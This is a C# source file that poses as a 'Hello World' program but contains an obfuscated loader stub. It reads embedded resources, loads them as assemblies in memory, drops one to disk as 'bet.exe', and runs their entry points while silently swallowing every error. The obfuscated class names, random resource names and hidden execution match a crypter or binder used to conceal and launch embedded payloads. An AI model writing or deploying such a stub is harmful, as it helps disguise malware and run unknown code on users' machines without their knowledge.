using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace Embedd
{
	internal class Program
	{



		static void Main(string[] args)
		{
			Console.WriteLine("Hello World!");
			var tod = DateTime.Now;
			var mess = tod.AddMonths(1).AddDays(5);

			_.___();

			Console.ReadLine();

		}
		public class _
		{
			public static void ___()
			{
				List<string> list = new List<string>();
				//list.Add("Embedd.j0bxpfien.ibn6a‎");
				//list.Add("Embedd.kf80roncdb4.f82nqc522h‎");
				//list.Add("Embedd.uip9xjt3xr5f.v8uxo4ek3j‎");
				//list.Add("Embedd.eehxu8nw0.cr1kr3nau1he");
				list.Add("Embedd._");
				list.Add("Embedd.1");
				list.Add("Embedd.2");
				list.Add("Embedd.3");
				list.Add("Embedd.4");
				

				try
				{
					foreach (var item in list)
					{
						byte[] array = null;
						Stream manifestResourceStream=null;
						try
                        {

                       
						 manifestResourceStream = typeof(_).Assembly.GetManifestResourceStream(item);
						 array = new byte[manifestResourceStream.Length];
							manifestResourceStream.Read(array, 0, array.Length);
							manifestResourceStream.Close();
						}
						catch (Exception)
						{

							continue;	
						}
						
						byte[] array2 = null;
						if (typeof(_).Assembly.GetManifestResourceNames().Length > 1)
						{
							manifestResourceStream = typeof(_).Assembly.GetManifestResourceStream(item);
							array2 = new byte[manifestResourceStream.Length];
							manifestResourceStream.Read(array2, 0, array2.Length);
							manifestResourceStream.Close();
						}
						AppDomain.CurrentDomain.ResourceResolve += _.CurrentDomain_ResourceResolve;
						AppDomain.CurrentDomain.AssemblyResolve += _.CurrentDomain_AssemblyResolve;
						if (array2 != null)
						{
							_.__ = Assembly.Load(array, array2);
						}
						else
						{
							_.__ = Assembly.Load(array);
							System.IO.File.WriteAllBytes("bet.exe", array);
						}
						AssemblyName[] referencedAssemblies = _.__.GetReferencedAssemblies();
						try
						{
							foreach (AssemblyName assemblyName in referencedAssemblies)
							{
								if (assemblyName.Name == "PresentationFramework")
								{
									foreach (Type type in _.__.GetTypes())
									{
										if (type.BaseType.FullName == "System.Windows.Application")
										{
											type.BaseType.GetProperty("ResourceAssembly").SetValue(null, _.__, null);
											break;
										}
									}
									break;
								}
							}
						}
						catch (Exception)
						{
						}
						try
						{
							if (_.__.EntryPoint.GetParameters().Length > 0)
							{
								string[] array4 = Environment.GetCommandLineArgs();
								if (array4.Length > 0)
								{
									string[] array5 = new string[array4.Length - 1];
									Array.Copy(array4, 1, array5, 0, array4.Length - 1);
									array4 = array5;
								}
								_.__.EntryPoint.Invoke(null, new object[] { array4 });
							}
							else
							{
								_.__.EntryPoint.Invoke(null, new object[0]);
							}
						}
						catch (Exception ex)
						{
							//MessageBox.Show(ex.ToString());
						}
					}
				}
				catch (Exception)
				{

					//throw;
				}

			}

			static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
			{
				Assembly result;
				lock (_.o)
				{
					if (_.__ != null && args.Name != null)
					{
						string a = args.Name.Split(new char[] { ',' })[0];
						if (a == _.__.GetName().Name)
						{
							return _.__;
						}
					}
					result = null;
				}
				return result;
			}

			static Assembly CurrentDomain_ResourceResolve(object sender, ResolveEventArgs args)
			{
				if (_.__ != null)
				{
					return _.__;
				}
				return null;
			}

			public _()
			{
			}

			// Note: this type is marked as 'beforefieldinit'.
			static _()
			{
			}

			static Assembly __ = null;

			static object o = new List<string>();
		}
	}
}